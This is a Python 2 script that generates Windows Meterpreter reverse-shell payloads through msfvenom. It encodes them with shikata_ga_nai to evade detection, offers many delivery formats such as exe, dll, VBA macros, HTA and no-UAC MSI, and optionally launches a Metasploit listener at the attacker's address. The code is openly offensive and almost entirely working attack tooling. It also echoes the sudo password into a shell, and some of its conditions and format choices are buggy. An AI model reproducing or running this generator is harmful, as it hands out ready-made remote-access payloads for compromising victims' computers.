'''
Before running this script, install the following packages

Download Metasploit Framework (https://www.metasploit.com/download)
sudo chmod +x metasploit-latest-linux-installer.run
sudo ./metasploit-latest-linux-installer.run

Create a folder 'Payload' where the script is stored.

'''

import os
import sys
import getpass
import subprocess
from pyfiglet import Figlet
from termcolor import colored

# Will create a directory "Payload" adjacent to the script

dir1 = "Payload/"
if not os.path.exists(dir1):
	os.makedirs(dir1)

output_file_path = os.getcwd()+"/"+dir1

font1 = Figlet(font='digital')
print font1.renderText("Payload generation for Windows")

# Provide Local host IP and Local Port (Attacker's IP & Port)

sys_password = getpass.getpass()
ip_adress = raw_input("Enter Listener IP Address: ")
port_no = raw_input("Enter Listener Port number: ")
file_name = raw_input("Enter the filename: ")

# Provide the desired extension which can used for the attack
print colored("Payload Extensions:\nasp, aspx, aspx-exe, dll, elf, elf-so, exe, \nexe-only, exe-service, exe-small, hta-psh, \nloop-vbs, macho, msi, msi-nouac, osx-app, psh, psh-net, \npsh-reflection, psh-cmd, vba, vba-exe, vba-psh, vbs, war", 'yellow')

payload_format = raw_input("Enter Payload Format: ")

run_console = raw_input("Do you want to run msfconsole? y/n: ")
msf = True

os.chdir(output_file_path)

# Condition provided to create the payload with the extension selected by the user

if payload_format == "asp":
	y = "msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b '\\x00' lhost="+ip_adress+" lport="+port_no+" -f "+payload_format+" > "+file_name+".asp"
elif payload_format == "aspx":
	y = "msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b '\\x00' lhost="+ip_adress+" lport="+port_no+" -f "+payload_format+" > "+file_name+".aspx"
elif payload_format == "aspx-exe":
	y = "msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b '\\x00' lhost="+ip_adress+" lport="+port_no+" -f "+payload_format+" > "+file_name+".aspx"
elif payload_format == "dll":
	y = "msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b '\\x00' lhost="+ip_adress+" lport="+port_no+" -f "+payload_format+" > "+file_name+".dll"
elif payload_format == "elf":
	y = "msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b '\\x00' lhost="+ip_adress+" lport="+port_no+" -f "+payload_format+" > "+file_name+".elf"
elif payload_format == "elf-so":
	y = "msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b '\\x00' lhost="+ip_adress+" lport="+port_no+" -f "+payload_format+" > "+file_name+".elf"
elif payload_format == "exe":
	y = "msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b '\\x00' lhost="+ip_adress+" lport="+port_no+" -f "+payload_format+" > "+file_name+".exe"
elif payload_format == "exe-only":
	y = "msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b '\\x00' lhost="+ip_adress+" lport="+port_no+" -f "+payload_format+" > "+file_name+".exe"
elif payload_format == "exe-service":
	y = "msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b '\\x00' lhost="+ip_adress+" lport="+port_no+" -f "+payload_format+" > "+file_name+".exe"
elif payload_format == "exe-small":
	y = "msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b '\\x00' lhost="+ip_adress+" lport="+port_no+" -f "+payload_format+" > "+file_name+".exe"
elif payload_format == "hta-psh":
	y = "msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b '\\x00' lhost="+ip_adress+" lport="+port_no+" -f "+payload_format+" > "+file_name+".psh"
elif payload_format == "loop-vbs":
	y = "msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b '\\x00' lhost="+ip_adress+" lport="+port_no+" -f "+payload_format+" > "+file_name+".vbs"
elif payload_format == "macho":
	y = "msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b '\\x00' lhost="+ip_adress+" lport="+port_no+" -f "+payload_format+" > "+file_name+".macho"
elif payload_format == "msi":
	y = "msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b '\\x00' lhost="+ip_adress+" lport="+port_no+" -f "+payload_format+" > "+file_name+".msi"
elif payload_format == "msi-nouac":
	y = "msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b '\\x00' lhost="+ip_adress+" lport="+port_no+" -f "+payload_format+" > "+file_name+".msi"
elif payload_format == "osx-app":
	y = "msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b '\\x00' lhost="+ip_adress+" lport="+port_no+" -f "+payload_format+" > "+file_name+".osx"
elif payload_format == "psh":
	y = "msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b '\\x00' lhost="+ip_adress+" lport="+port_no+" -f "+payload_format+" > "+file_name+".psh"
elif payload_format == "psh-net":
	y = "msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b '\\x00' lhost="+ip_adress+" lport="+port_no+" -f "+payload_format+" > "+file_name+".psh"
elif payload_format == "psh-reflection":
	y = "msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b '\\x00' lhost="+ip_adress+" lport="+port_no+" -f "+payload_format+" > "+file_name+".psh"
elif payload_format == "psh-cmd":
	y = "msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b '\\x00' lhost="+ip_adress+" lport="+port_no+" -f "+payload_format+" > "+file_name+".psh"
elif payload_format == "vba":
	y = "msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b '\\x00' lhost="+ip_adress+" lport="+port_no+" -f "+payload_format+" > "+file_name+".vba"
elif payload_format == "vba-exe":
	y = "msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b '\\x00' lhost="+ip_adress+" lport="+port_no+" -f "+payload_format+" > "+file_name+".vba"
elif payload_format == "vba-psh":
	y = "msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b '\\x00' lhost="+ip_adress+" lport="+port_no+" -f "+payload_format+" > "+file_name+".vba"
elif payload_format == "vbs":
	y = "msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b '\\x00' lhost="+ip_adress+" lport="+port_no+" -f "+payload_format+" > "+file_name+".vbs"
elif payload_format == "war":
	y = "msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b '\\x00' lhost="+ip_adress+" lport="+port_no+" -f "+payload_format+" > "+file_name+".war"
else:
	print "Invalid File Format"
	msf =  False
	sys.exit()

os.system(y)

# Initiate the MSF Console with the listener turned on

if run_console == "y" or run_console == "yes" or run_console == "Yes" and msf == True:	
	k = "echo %s | sudo -S su" %sys_password
	os.system(k)
	x = "sudo -S msfconsole  -x 'use exploit/multi/handler' -x 'set payload windows/meterpreter/reverse_tcp' -x 'set lhost %s' -x 'set lport %s' -x 'exploit'" %(ip_adress,port_no)
	os.system(x)
elif run_console == "n" or run_console == "no" or run_console == "No" and msf == False:
	pass
else:
	pass
